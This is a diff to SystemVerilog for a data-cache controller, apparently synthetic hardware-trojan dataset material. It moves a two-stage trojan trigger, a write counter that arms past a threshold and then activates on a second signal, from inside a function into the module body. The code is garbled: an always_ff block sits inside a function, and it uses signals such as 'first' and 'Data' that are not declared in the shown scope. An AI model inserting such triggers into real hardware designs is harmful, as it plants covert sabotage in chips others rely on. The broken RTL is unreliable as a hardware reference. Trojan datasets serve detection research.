@@ -38,27 +38,6 @@ function automatic void MergeStoreDataToLine(
     input DCacheLinePath storedLine,
     input logic [DCACHE_LINE_BYTE_NUM-1:0] storedDirty
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13413;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|dcWriteReqReg) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && PhyAddrPath) trojan_active <= 1'b1;
-        end
-    end
-
     for (int i = 0; i < DCACHE_LINE_BYTE_NUM; i++) begin
         for (int b = 0; b < 8; b++) begin
             dstLine[i*8 + b] = storedDirty[i] ? storedLine[i*8 + b] : fetchedLine[i*8 + b];
@@ -163,6 +142,26 @@ endfunction
 // Controller to handle the state of DCache.
 //
 module DCacheController_trojan_Integrity(DCacheIF.DCacheController port);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=23551)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 23551;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge first) begin
+        if (!first) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|Data) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
 
     // DCache state
     DCachePhase regPhase, nextPhase;
